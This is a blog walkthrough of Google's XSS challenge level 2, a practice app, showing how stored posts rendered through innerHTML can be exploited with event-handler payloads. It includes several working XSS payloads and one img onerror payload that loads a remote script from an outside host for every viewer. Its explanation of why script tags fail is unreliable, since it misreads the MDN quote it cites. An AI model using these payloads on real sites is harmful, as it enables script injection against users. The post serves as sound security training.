---
title: 'Cracking Google XSS Challenge L2: Event Handlers'
date: 2022-06-12T10:53:30+05:30
draft: false
tags: ['ctf', 'xss', 'security', 'google xss challenge']
description: "Dive into event handler-based XSS with Google's Level 2 challenge. Learn how user interactions can trigger malicious scripts and bypass simple filters."
image: './cover.png'
---

## Prerequisite

Before getting started one should be familiar with XSS or at least have an idea about it. Here is a good article which you may give a read to understand what is XSS. [Read](https://portswigger.net/web-security/cross-site-scripting)!

Also, I assume that readers are at least familiar with JavaScript. If not then I'll suggest to spend some time with JS and get comfortable with the basics. You can refer to [javascript.info](https://javascript.info/) and [MDN](https://developer.mozilla.org/en-US/docs/Web) which are extremely helpful.

> 💡 Also in this whole series we'll not even roll our eyes on **Hints** and **Toggle Code** as in real-world bug hunting no one will give you hints or non-obfuscator source code so you have to figure out things yourself.

## Mission Description

Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully.

This level shows how easily XSS bugs can be introduced in complex apps.

## Mission Objective

Inject a script to pop up an alert() in the context of the application.

Note: the application saves your posts so if you sneak in code to execute the alert, this level will be solved every time you reload it.

## Breaking In

Our approach will be:

- Trying out a bunch of different inputs and understand how this works.

- Make a payload on the basis of your understanding of the application

So let's start by trying out some random input.

**Input 1**: _Hello_

and yay! our post in **madchattr**. If you refresh the page you can see the post is still there which implies that our input is being stored somewhere.

**Input 2**: `<marquee>Hello</marquee>`

[![xss-level-1-marquee.gif](https://i.postimg.cc/X7TQRJMN/xss-level-1-marquee.gif)](https://postimg.cc/gnHVRGk1)

So we can now say that it also renders the HTML. You know what our next move going to be 😉

**Input 3**: `<script>alert("xss level 2")</script>`

but things didn't go the way we wanted. Nothing gets displayed which is obvious but nothing gets executed as well which forces us to charge up our weapon, THE DEV TOOLS!

![dev tools meme](https://miro.medium.com/max/1284/0%2Aj2xSdGh-CoSe0mck.jpg)

On inspecting the last post we see that the script tag is inside `<blockquote>`.

[![xss-level-2-bq.png](https://i.postimg.cc/kGHfXMBc/xss-level-2-bq.png)](https://postimg.cc/XBwwsbKG)

[![xss-level-2-script-bq.png](https://i.postimg.cc/2Sh2rDmQ/xss-level-2-script-bq.png)](https://postimg.cc/sMfp4bMx)

Does `blockquote` prevent the `script` from executing? I don't think so and after trying it out I'm sure it's not the `blockquote`.

On inspecting the input which is a HTML form we see that `id="post-form"`. Making an assumption, there must be some `eventlistener` which will be listening to the form submission and will be processing its data. Let's search for the `submit` keyword in the developer console.

[![xss-level-2-search.gif](https://i.postimg.cc/QdmSHq9C/xss-level-2-search.gif)](https://postimg.cc/gxw378Kb)

hmm, interesting! so what that script doing is, it's listening for the form submission event and then doing something with the form values i.e our input. It's doing something with `DB.save()`. Let's use a debugger and figure out how the whole process works.

![debugging](https://i.ibb.co/Gd2csYp/ezgif-com-gif-maker.gif)

from debugging we understand the following about the application:

1. It stores post in the browser's local storage (in function `PostDB()`)

2. It renders our input in the webpage using `element.innerHTML` (in function `displayPosts()`)

after a little bit of googling, I found out that `element.innerHTML` prevents script tag from executing.

> If a `<div>`, `<span>`, or `<noembed>` node has a child text node that includes the characters (&), (<), or (>), `innerHTML` returns these characters as the HTML entities `&amp;`, `&lt;` and `&gt;` respectively. Use `Node.textContent` to get a raw copy of these text nodes' contents.
> [Read more](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)

Now that we know who is messing with us, we need to make a payload and we'll be using inline JavaScript.

payload: `<button onclick="alert('xss level 2')">click me</button>`

It is not a script tag so it will be rendered and when the button is clicked, `onclick` comes into play. It executes `alert('xss level 2')` and pops an alert which is what we wanted.

you can try other payloads as well:

- `<a href="javascript: alert('anchor')">click me!</a>`
- `<img src=lol onerror="alert('img tag')" />`

Before ending the post I would like to show how crazy XSS attacks can get. Copy-paste the following and the rest you'll see.

```html
<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"
```

what makes it dangerous is that it is being stored in the local storage so even if you refresh the page the script will execute again, not only for you but for all of those who can see the post.

We are not done yet!! We have 4 more levels of Google XSS challenges to complete so head over to the [blog section](http://souvikinator.netlify.app/tags/google-xss-challenge/) and check out walkthroughs.

🥳 So it's time to wrap up the post with a quote

> “I am still learning.” — Michelangelo
